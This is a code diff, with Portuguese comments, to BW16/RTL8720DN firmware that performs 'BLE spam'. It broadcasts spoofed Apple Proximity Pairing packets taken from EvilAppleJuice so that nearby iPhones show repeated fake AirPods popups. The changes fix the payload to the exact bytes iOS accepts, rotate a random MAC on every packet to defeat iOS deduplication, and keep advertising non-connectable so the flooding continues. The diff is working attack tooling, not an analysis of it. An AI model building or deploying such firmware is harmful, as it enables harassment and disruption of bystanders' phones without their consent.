@@ -5,8 +5,9 @@
 // Adaptações para Ameba SDK (BLEDevice.h v3.1.9):
 //  - Objeto global é BLE (extern BLEDevice BLE), não BLEDevice::xxx
 //  - BLEAdvert::setAdvData(uint8_t*, uint8_t) aceita buffer raw
-//  - Sem setDeviceAddress() público → MAC fixo do chip (SDK limitação)
-//  - ADV type randômico: ADV_IND / ADV_SCAN_IND / ADV_NONCONN_IND
+//  - MAC aleatório via le_set_rand_addr() + GAP_PARAM_ADV_LOCAL_ADDR_TYPE
+//  - Reconfiguração só com o advertising em GAP_ADV_STATE_IDLE
+//  - PDU fixo ADV_NONCONN_IND (não conectável)
 // =========================================================
 
 // STL primeiro para evitar conflito com macros do Ameba
@@ -16,11 +17,28 @@
 #include "ble_spam.h"
 #include "debug.h"
 
+// =========================================================
+// Ajustes de compatibilidade com o RTL8720DN (BW16)
+//
+// ROTATE_MAC = 1: troca o endereço aleatório a cada pacote (como o
+// EvilAppleJuice do ESP32). Isso é o que permite popups repetidos no modo
+// FOCUSED (só AirPods). Se o seu módulo/iPhone não mostrar NADA, troque para 0:
+// o advertising passa a usar o MAC público fixo do chip, exatamente como na
+// implementação BLE-spam-BW16 que é conhecida por funcionar.
+//
+// ADV_TYPE: usamos sempre ADV_NONCONN_IND (não conectável). EVITAR ADV_IND,
+// pois o iPhone pode tentar conectar e derrubar o advertising.
+// =========================================================
+#ifndef BLE_SPAM_ROTATE_MAC
+#define BLE_SPAM_ROTATE_MAC 1
+#endif
+
 extern "C" {
 #include "gap.h"
 #include "gap_adv.h"
 #include "gap_le.h"
 #include "gap_le_types.h"
+#include "gap_msg.h"
 }
 
 // =========================================================
@@ -77,28 +95,16 @@ static uint8_t generateApplePacket(const AppleDevice& dev, uint8_t* buf) {
   memset(buf, 0, 31);
 
   if (dev.type == APPLE_AUDIO) {
-    // Full 31-byte EvilAppleJuice payload (ADV record completo)
-    // Bytes [8..18] são o corpo — randomizar 3 deles simula MACs diferentes,
-    // evitando que o iOS deduplique e ignore pacotes repetidos.
-    buf[0]  = 0x1e;        // Length = 30 (resto do record)
-    buf[1]  = 0xff;        // AD Type: Manufacturer Specific
-    buf[2]  = 0x4c;        // Apple OUI [0]
-    buf[3]  = 0x00;        // Apple OUI [1]
-    buf[4]  = 0x07;        // Proximity Pairing subtype
-    buf[5]  = 0x19;        // Length of subtype data
-    buf[6]  = 0x07;        // Status flags
-    buf[7]  = dev.modelId; // Model ID
-    buf[8]  = 0x20;
-    buf[9]  = (uint8_t)random(0xFF); // randomiza → novo "device" a cada pacote
-    buf[10] = 0xaa;
-    buf[11] = (uint8_t)random(0xFF); // randomiza
-    buf[12] = 0x01;
-    buf[13] = 0x00;
-    buf[14] = 0x00;
-    buf[15] = (uint8_t)random(0xFF); // randomiza
-    buf[16] = 0x12;
-    buf[17] = 0x12;
-    buf[18] = 0x12;
+    // Payload EXATO do EvilAppleJuice-ESP32 (src/devices.cpp).
+    // ATENÇÃO: o corpo NÃO pode ser randomizado. iOS valida a estrutura do
+    // "Proximity Pairing" e descarta o pacote se 0x75 / 0x30 / 0x45 forem
+    // alterados — era exatamente esse o bug que impedia os popups.
+    static const uint8_t header[7] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
+    static const uint8_t body[11] = {0x20, 0x75, 0xaa, 0x30, 0x01,
+                                     0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
+    memcpy(buf, header, sizeof(header));
+    buf[7] = dev.modelId;          // Model ID
+    memcpy(buf + 8, body, sizeof(body));
     // bytes 19..30 = 0x00 (já zerados pelo memset)
     return 31;
   } else {
@@ -120,13 +126,70 @@ uint32_t ble_pkt_sent  = 0;
 uint8_t  ble_spam_idx  = 0;
 bool     ble_focused_mode = false; // false=ALL(22 devices), true=FOCUSED(AirPods only)
 
-static bool ble_initialized = false;
+static bool ble_initialized = false;   // spam ativo (advertising rodando)
+static bool ble_stack_ready = false;   // stack BLE/GAP inicializado
+static uint32_t ble_last_tx_ms = 0;    // diagnóstico de cadência
+static bool ble_rand_addr_broken = false; // controller recusou endereço aleatório
+
+// =========================================================
+// Helpers de advertising (SDK Ameba)
+// =========================================================
+
+// Espera o GAP confirmar que o advertising parou (gap_adv_state == IDLE).
+// CRITICO: o SDK só aceita alteração de parâmetros de advertising quando o
+// estado é IDLE. Se chamarmos le_adv_set_param()/le_set_rand_addr() enquanto
+// o stop ainda está pendente, o stack ignora tudo silenciosamente.
+static bool adv_wait_idle(uint32_t timeout_ms) {
+  uint32_t start = millis();
+  T_GAP_DEV_STATE st;
+  while (millis() - start < timeout_ms) {
+    if (le_get_gap_param(GAP_PARAM_DEV_STATE, &st) == GAP_CAUSE_SUCCESS) {
+      if (st.gap_init_state != GAP_INIT_STATE_STACK_READY) return false;
+      if (st.gap_adv_state == GAP_ADV_STATE_IDLE) return true;
+    }
+    delay(2);
+  }
+  return false;
+}
+
+// Gera e aplica um novo endereço aleatório (identidade nova para o iOS).
+// Retorna o tipo de endereço a usar no advertising; se o controller recusar,
+// cai para o endereço público do chip em vez de simplesmente não anunciar.
+static uint8_t adv_set_new_random_addr() {
+  if (!BLE_SPAM_ROTATE_MAC || ble_rand_addr_broken) {
+    return GAP_LOCAL_ADDR_LE_PUBLIC;
+  }
+
+  uint8_t mac[6];
+  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(256);
+
+  // Static Random Address (BT Core 5.0): bits 7:6 do octeto MAIS significativo
+  // devem ser 11. O array do SDK é little-endian, então o MSB é mac[5].
+  mac[5] = (uint8_t)((mac[5] & 0x3F) | 0xC0);
+
+  T_GAP_CAUSE cause = le_set_rand_addr(mac);
+  if (cause != GAP_CAUSE_SUCCESS) {
+    // Fallback: pede ao controller para gerar um endereço estático válido.
+    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, mac) == GAP_CAUSE_SUCCESS) {
+      cause = le_set_rand_addr(mac);
+    }
+  }
+
+  if (cause != GAP_CAUSE_SUCCESS) {
+    ble_rand_addr_broken = true; // não insiste a cada ciclo
+    DEBUG_SER_PRINT("[BLE] le_set_rand_addr falhou (cause=0x");
+    DEBUG_SER_PRINT((int)cause, HEX);
+    DEBUG_SER_PRINT(") -> usando endereco publico fixo\n");
+    return GAP_LOCAL_ADDR_LE_PUBLIC;
+  }
+  return GAP_LOCAL_ADDR_LE_RANDOM;
+}
 
 // =========================================================
 // ble_spam_next – avança para o próximo dispositivo e transmite
 // =========================================================
 void ble_spam_next() {
-  if (!ble_initialized) return;
+  if (!ble_initialized || !ble_stack_ready) return;
 
   if (ble_focused_mode) {
     // MODO FOCUSED: só AirPods (idx=0) com MAC novo a cada ciclo.
@@ -147,52 +210,52 @@ void ble_spam_next() {
   uint8_t packet[31];
   uint8_t pktLen = generateApplePacket(dev, packet);
 
+  BLEAdvert* advert = BLE.configAdvert();
+
+  // 1) Para o advertising e espera o stack confirmar IDLE antes de reconfigurar.
+  le_adv_stop();
+  if (!adv_wait_idle(200)) {
+    DEBUG_SER_PRINT("[BLE] AVISO: adv nao ficou IDLE, reconfigurando mesmo assim.\n");
+  }
+
+  // 2) Novo Random MAC — acessórios Apple reais usam endereço privado aleatório.
+  // Sem isso o iOS deduplica e ignora pacotes do mesmo MAC.
+  uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_PUBLIC;
+  if (BLE_SPAM_ROTATE_MAC) {
+    adv_addr_type = adv_set_new_random_addr();
+  }
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);
+
+  // 3) ADV sempre não-conectável (mesma escolha da implementação BW16 que
+  // funciona). ADV_IND/SCAN_IND fazem o iPhone tentar conectar e interromper
+  // o advertising.
+  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  advert->setMinInterval(20); // 20ms — Apple recomenda para maxima descoberta (QA1931)
+  advert->setMaxInterval(20);
+  advert->setAdvData(packet, pktLen);
+  advert->updateAdvertParams();
+
+  // 4) Inicia e verifica o resultado (antes era ignorado).
+  T_GAP_CAUSE cause = le_adv_start();
+  if (cause != GAP_CAUSE_SUCCESS) {
+    DEBUG_SER_PRINT("[BLE] le_adv_start falhou (cause=0x");
+    DEBUG_SER_PRINT((int)cause, HEX);
+    DEBUG_SER_PRINT(")\n");
+    return;
+  }
+
+  ble_pkt_sent++;
+
   DEBUG_SER_PRINT("[BLE] TX: ");
   DEBUG_SER_PRINT(dev.name);
   DEBUG_SER_PRINT(" id=0x");
   DEBUG_SER_PRINT(dev.modelId, HEX);
   DEBUG_SER_PRINT(" len=");
   DEBUG_SER_PRINT((int)pktLen);
-  DEBUG_SER_PRINT("\n");
-
-  BLEAdvert* advert = BLE.configAdvert();
-
-  // Para o advertising para reconfigurar MAC e payload.
-  // CRITICO: O delay(10) é obrigatório no Ameba SDK — sem ele o driver GAP
-  // não finaliza o estado ADV_IDLE e o startAdv() seguinte é ignorado
-  // silenciosamente, causando o bug de "só 1 popup gerado".
-  advert->stopAdv();
-  delay(10);
-
-  // Novo Random MAC a cada ciclo — acessórios Apple reais usam Random Private Address.
-  // Sem isso o iOS deduplica e ignora pacotes do mesmo MAC como já processados.
-  // Bits 7:6 do byte [5] DEVEM ser 11 = Static Random Address (BT Spec 5.0).
-  uint8_t rand_mac[6];
-  for (int i = 0; i < 6; i++) {
-    rand_mac[i] = (uint8_t)random(0xFF);
-  }
-  rand_mac[5] |= 0xC0;
-  le_set_gap_param(GAP_PARAM_RANDOM_ADDR, 6, rand_mac);
-
-  uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_RANDOM;
-  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);
-
-  // Alterna tipo de ADV aleatoriamente — port do EvilAppleJuice original.
-  // O iOS reage diferente a ADV_IND / ADV_SCAN_IND / ADV_NONCONN_IND
-  // dependendo do dispositivo simulado: variar aumenta a taxa de popups.
-  static const uint8_t adv_types[3] = {
-    GAP_ADTYPE_ADV_IND,
-    GAP_ADTYPE_ADV_SCAN_IND,
-    GAP_ADTYPE_ADV_NONCONN_IND,
-  };
-  advert->setAdvType(adv_types[random(3)]);
-  advert->setMinInterval(20); // 20ms — Apple recomenda para maxima descoberta (QA1931)
-  advert->setMaxInterval(20);
-  advert->setAdvData(packet, pktLen);
-  advert->updateAdvertParams();
-  advert->startAdv();
-
-  ble_pkt_sent++;
+  DEBUG_SER_PRINT(" desde ");
+  DEBUG_SER_PRINT((int)(millis() - ble_last_tx_ms));
+  DEBUG_SER_PRINT("ms\n");
+  ble_last_tx_ms = millis();
 }
 
 // =========================================================
@@ -204,27 +267,32 @@ void start_ble_spam() {
   DEBUG_SER_PRINT(ble_focused_mode ? "[BLE] Modo FOCUSED: AirPods spam continuo\n"
                                    : "[BLE] Modo ALL: 22 dispositivos AUDIO\n");
 
-  BLE.init();
+  if (!ble_stack_ready) {
+    BLE.init();
 
-  // Configura parâmetros base antes de beginPeripheral()
-  BLEAdvert* advert = BLE.configAdvert();
-  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
-  advert->setMinInterval(20); // 20ms
-  advert->setMaxInterval(20);
+    // Configura parâmetros base ANTES de subir o stack: quando o GAP fica
+    // pronto o callback do SDK chama le_adv_start() automaticamente, então o
+    // primeiro advertising já precisa ter um payload Apple válido.
+    BLEAdvert* advert = BLE.configAdvert();
+    advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+    advert->setMinInterval(20);
+    advert->setMaxInterval(20);
 
-  // Random MAC inicial
-  uint8_t rand_mac[6];
-  for (int i = 0; i < 6; i++) rand_mac[i] = (uint8_t)random(0xFF);
-  rand_mac[5] |= 0xC0;
-  le_set_gap_param(GAP_PARAM_RANDOM_ADDR, 6, rand_mac);
-  uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_RANDOM;
-  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);
+    uint8_t first[31];
+    uint8_t firstLen = generateApplePacket(ALL_APPLE_DEVICES[AIRPODS], first);
+    advert->setAdvData(first, firstLen);
+    advert->updateAdvertParams();
 
-  BLE.beginPeripheral();
+    DEBUG_SER_PRINT("[BLE] Inicializando stack BLE (aguarde)...\n");
+    BLE.beginPeripheral();   // aguarda GAP_INIT_STATE_STACK_READY
+    ble_stack_ready = true;
+    DEBUG_SER_PRINT("[BLE] Stack BLE pronto.\n");
+  }
 
   ble_initialized = true;
   isBleSpamming   = true;
   ble_pkt_sent    = 0;
+  ble_rand_addr_broken = false; // tenta endereço aleatório novamente
   ble_spam_idx    = (uint8_t)(NUM_APPLE_DEVICES - 1); // next() vai para AIRPODS (idx=0, primeiro AUDIO)
 
   DEBUG_SER_PRINT("[BLE] Pronto. Iniciando broadcast...\n");
@@ -237,9 +305,13 @@ void start_ble_spam() {
 void stop_ble_spam() {
   isBleSpamming = false;
   if (ble_initialized) {
-    BLE.configAdvert()->stopAdv();
-    BLE.end();
+    le_adv_stop();
+    adv_wait_idle(100);
     ble_initialized = false;
     DEBUG_SER_PRINT("[BLE] BLE spam parado.\n");
   }
+
+  // NÃO chamamos BLE.end(): o stack da Ameba não reinicializa de forma
+  // confiável e um segundo start() podia travar o firmware. O stack fica
+  // pronto e apenas o advertising é interrompido.
 }
